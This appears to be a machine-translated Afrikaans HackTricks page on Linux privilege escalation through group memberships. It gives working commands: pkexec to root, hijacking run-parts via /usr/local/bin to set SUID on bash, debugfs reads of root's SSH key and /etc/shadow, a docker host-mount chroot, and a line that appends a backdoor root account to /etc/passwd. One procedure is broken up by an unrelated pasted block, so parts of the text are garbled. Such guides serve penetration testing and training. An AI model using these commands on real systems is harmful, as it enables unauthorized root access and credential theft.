# Interessante Groepe - Linux Privesc

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Sudo/Admin Groepe

### **PE - Metode 1**

**Soms**, **standaard (of omdat sommige sagteware dit nodig het)** binne die **/etc/sudoers** lêer kan jy een van hierdie lyne vind:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat behoort tot die groep sudo of admin enigiets as sudo kan uitvoer**.

Indien dit die geval is, kan jy eenvoudig **root word deur die volgende uit te voer**:
```
sudo su
```
### PE - Metode 2

Vind alle suid-binêre en kontroleer of die binêre **Pkexec** daar is:
```bash
find / -perm -4000 2>/dev/null
```
Indien jy vind dat die binêre **pkexec 'n SUID-binêre** is en jy behoort aan **sudo** of **admin**, kan jy waarskynlik binêre lêers uitvoer as sudo deur `pkexec` te gebruik.\
Dit is omdat hierdie groepe tipies binne die **polkit-beleid** is. Hierdie beleid identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **standaard** in sommige Linux-distros verskyn die groepe **sudo** en **admin**.  

Om **root te word kan jy uitvoer**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
As jy probeer om **pkexec** uit te voer en jy kry hierdie **fout**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie aanlyn is sonder 'n GUI nie**. En daar is 'n manier om hierdie probleem te omseil hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy benodig **2 verskillende ssh-sessies**:

{% code title="sessie1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
## Interessante Groepe vir Linux Privilege Escalation

In Linux, daar is verskeie interessante groepe wat 'n aanvaller kan help om privilegie-escalasie aanvalle uit te voer. Hier is 'n lys van 'n paar van hierdie groepe:

1. **`sudo` Groep:**
   Die lede van hierdie groep kan dikwels `sudo` gebruik om spesifieke take uit te voer wat hulle normaalweg nie sou kon doen nie.

2. **`docker` Groep:**
   As 'n gebruiker lid is van die `docker` groep, kan hulle dikwels `docker` bevele hardloop sonder die behoefte aan `sudo`.

3. **`lxd` Groep:**
   Soos die `docker` groep, kan lede van die `lxd` groep dikwels `lxd` bevele hardloop sonder `sudo`.

4. **`wheel` Groep:**
   Die `wheel` groep is dikwels gekonfigureer om `sudo` toegang te hê, wat dit 'n interessante teiken vir aanvallers maak.

5. **`root` Groep:**
   Alhoewel dit nie algemeen aanbeveel word nie, kan 'n aanvaller met toegang tot 'n rekening wat lid is van die `root` groep maklik beheer oor die stelsel verkry.

Dit is belangrik om bewus te wees van hierdie groepe en om hulle regte behoorlik te bestuur om die risiko van privilegie-escalasie aanvalle te verminder.

{% code %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wielgroep

**Soms**, **standaard** binne die **/etc/sudoers** lê hierdie lyn:
```
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat behoort tot die groep wiel enigiets as sudo kan uitvoer**.

Indien dit die geval is, kan jy eenvoudig **root word deur die volgende uit te voer**:
```
sudo su
```
## Skadugroep

Gebruikers van die **groep skadu** kan die **/etc/shadow** lêer **lees**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lees die lêer en probeer om **sekere hasse te kraak**.

## Personeel Groep

**personeel**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) by te voeg sonder om root-voorregte nodig te hê (let wel dat uitvoerbare lêers in `/usr/local/bin` in die PATH-veranderlike van enige gebruiker is, en hulle mag die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam "oorheers"). Vergelyk met die groep "adm", wat meer verband hou met monitering/sekuriteit. [\[bron\]](https://wiki.debian.org/SystemGroups)

In debian-verspreidings, wys die `$PATH`-veranderlike dat `/usr/local/` as die hoogste prioriteit uitgevoer sal word, of jy 'n bevoorregte gebruiker is of nie.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
As ons sommige programme in `/usr/local` kan kap, kan ons maklik root kry.

Die kap van die `run-parts` program is 'n maklike manier om root te kry, omdat die meeste programme 'n `run-parts` sal hardloop (soos crontab, wanneer ssh aanmeld).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
of Wanneer 'n nuwe ssh-sessie aanmeld.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Uitbuiting**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Skyf Groep

Hierdie voorreg is amper **gelykstaande aan worteltoegang** omdat jy toegang kan verkry tot alle data binne die masjien.

Lêers: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Let wel dat jy ook **lêers kan skryf** met debugfs. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy die volgende doen:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Maar, as jy probeer om lêers wat deur root besit word te **skryf** (soos `/etc/shadow` of `/etc/passwd`) sal jy 'n "**Toestemming geweier**" fout kry.

## Video Groep

Deur die opdrag `w` te gebruik, kan jy **sien wie op die stelsel ingeteken is** en dit sal 'n uitset soos die volgende een wys:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** beteken dat die gebruiker **yossi fisies ingeteken** is by 'n terminal op die rekenaar.

Die **video groep** het toegang om die skermuitset te sien. Basies kan jy die skerms waarneem. Om dit te doen, moet jy **die huidige beeld op die skerm vasvang** in rou data en die resolusie kry wat die skerm gebruik. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm vind op `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Om die **rofbeeld** te **open**, kan jy **GIMP** gebruik, kies die \*\*`screen.raw` \*\* lêer en kies as lêertipe **Rofbeelddata**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Verander dan die Breedte en Hoogte na die wat op die skerm gebruik word en kyk na verskillende Beeldtipes (en kies die een wat die skerm beter wys):

![](<../../../.gitbook/assets/image (288).png>)

## Rooigroep

Dit lyk asof **lede van die rooigroep** standaard toegang kan hê om **sekere dienskonfigurasie-lêers** of **sekere biblioteeklêers** of **ander interessante dinge** te wysig wat gebruik kan word om voorregte te eskaleer...

**Kyk watter lêers rooigroeplede kan wysig**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Groep

Jy kan die **wortel-lêerstelsel van die gasheer-rekenaar aan 'n instansie se volume koppel**, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief worteltoegang tot die rekenaar.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## Linux-groep

Gewoonlik het **lede** van die groep **`adm`** toestemmings om **log** lêers binne _/var/log/_ te **lees**.\
Daarom, as jy 'n gebruiker binne hierdie groep gekompromitteer het, moet jy beslis na die **logs kyk**.
